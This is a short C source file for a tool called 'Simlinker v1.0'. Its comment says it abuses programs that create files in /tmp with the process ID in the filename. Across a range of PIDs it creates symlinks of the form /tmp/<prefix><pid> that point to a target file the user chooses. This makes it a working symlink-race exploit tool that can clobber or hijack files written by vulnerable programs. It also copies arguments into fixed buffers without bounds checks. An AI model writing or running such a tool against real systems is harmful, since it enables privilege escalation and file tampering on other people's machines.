#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>


/*symlink creator to abuse files creation in /tmp where the pid is used
in the filename.
First we need to take arguments that consist of a range of numbers
and a filename to link from and a filename to link to.
*/

extern int errno;

int
main (int argc, char **argv)
{

  int x = 0, from = 0, to = 0, result = 0;
  char dest_name[256];
  char from_name[256];


  from = getpid ();
  if (argc == 1)
    {

      printf ("Simlinker v1.0 \n");
      printf
	("Usage: %s number of symlinks starting from my pid:%d from_file to_file\n",
	 argv[0], from);
      return (0);
    }

  to = atoi (argv[1]);
  to = from + to;

  printf ("Starting from %d\n", from);

  for (x = from; x <= to; x++)
    {
      sprintf (dest_name, "%s", argv[3]);
      sprintf (from_name, "/tmp/%s%d", argv[2], x);

      printf ("Symlinking %s->%s\n", from_name, dest_name);

      result = symlink (dest_name, from_name);

      if (result < 0)
	{

	  printf ("Error: %d, %s\n", result, strerror (errno));
	  return (-1);
	}

    }

  return (0);
}
